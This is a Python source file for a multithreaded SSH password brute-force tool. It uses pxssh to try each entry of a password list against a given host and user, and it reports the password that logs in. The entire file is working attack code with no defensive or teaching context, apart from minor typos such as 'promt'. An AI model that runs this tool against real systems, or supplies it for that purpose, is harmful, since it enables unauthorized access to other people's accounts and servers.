from optparse import OptionParser
import pxssh
import time
from threading import *

MAX_CONNECTIONS = 5
CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTIONS)
Found = False
Fails = 0



def send_command(s, cmd):
    s.sendline(cmd)
    s.promt()
    print(s.before)


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Found password: %s' % password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            CONNECTION_LOCK.release()


def main():
    parser = OptionParser('usage%prog -t <target host> -u <user> -p <password list>')
    parser.add_option('-t', dest='target_host', type='string', help='specify target host')
    parser.add_option('-f', dest='password_file', type='string', help='specify password list')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    options, args = parser.parse_args()

    host = options.target_host
    user = options.user
    password_file = options.password_file

    if host is None or user is None or password_file is None:
        print(parser.usage)
        exit(0)

    with open(password_file, 'r') as f:
        for line in f.readlines():
            if Found:
                print('[*] Exiting: Password Found')
                exit(0)
            if Fails > 5:
                print('[!] Exiting: Too many sockets Timeouts')
                exit(0)
            CONNECTION_LOCK.acquire()
            password = line.strip('\n')
            print('Testing: %s' % password)
            t = Thread(target=connect, args=(host, user, password, True))
            child = t.start()


if __name__ == '__main__':
    main()